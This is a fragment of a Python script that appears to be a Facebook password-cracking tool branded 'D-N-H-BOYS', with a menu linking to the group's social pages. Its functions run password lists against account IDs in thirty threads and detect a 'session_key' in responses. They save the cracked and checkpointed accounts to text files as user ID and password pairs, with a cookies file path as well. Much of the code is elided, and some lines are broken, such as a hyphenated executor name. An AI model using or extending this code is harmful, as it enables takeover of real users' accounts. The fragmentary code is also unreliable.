...
def SIALZADA():
		...
		if shm =='1':
			...
			os.system('xdg-https://www.facebook.com/dark.net.hacker.boys1')
			SIALZADA()
		elif shm =='8':
			os.system('xdg-open https://youtube.com/@SI_48')
			SIALZADA()
		elif shm =='9':
			wp=('ENIBC9FIBwv0ozvzLCpVE6')
			os.system('xdg-open https://chat.whatsapp.com/ENIBC9FIBwv0ozvE6')
			SIALZADA()
		elif shm =='0':
...
def file_crack():
	...
	with tred(max_workers=30) as SIALZADA:
		...
		print("\33[1;37m [+] Your Cp/Ok Id Save In D-N-H-BOYS  Folder")
		linex()
		for user in fo:
			ids,names = user.split('|')
			passlist = plist
			if methd =='1':
				D-N-H-BOYS.submit(api1,ids,names,passlist)
			else:
				D-N-H-BOYS.submit(api1,ids,names,passlist)
	print('\033[1;37m')
	linex()
...
def rd1(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r\33[1;37m[ D-N-H-BOYS ]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
				...
				if 'session_key' in po:
						...
						file_path_ok = os.path.join(folder_path, 'D-N-H-BOYS_RANDOM_OK.txt')
						file_path_cookies = os.path.join(folder_path, 'D-N-H-BOYS_COOKIES.txt')
					...
					#	print(f'\r\r\33[1m\33[1;35m [SIALXD-CP] '+uid+' | '+pas+'\033[1;97m')
						file_path = os.path.join(folder_path, 'D-N-H-BOYS-CP.txt')
...
def api1(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\33[1;37m[ D-N-H-BOYS-M1 ]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
					...
					print('\r\r\033[1;32m [D-N-H-BOYS-OK] '+uid+' | '+pas)
					linex()
					file_path = os.path.join(folder_path, 'D-N-H-BOYS_FILE_OK.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					oks.append(uid)
					break
					...
					uid = str(po['error']['error_data']['uid'])
			#		print(f'\r\r\33[1m\33[1;35m [D-N-H-BOYS-CP] '+uid+' | '+pas+'\033[1;97m')
					file_path = os.path.join(folder_path, 'D-N-H-BOYS-CP.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					cps.append(uid)
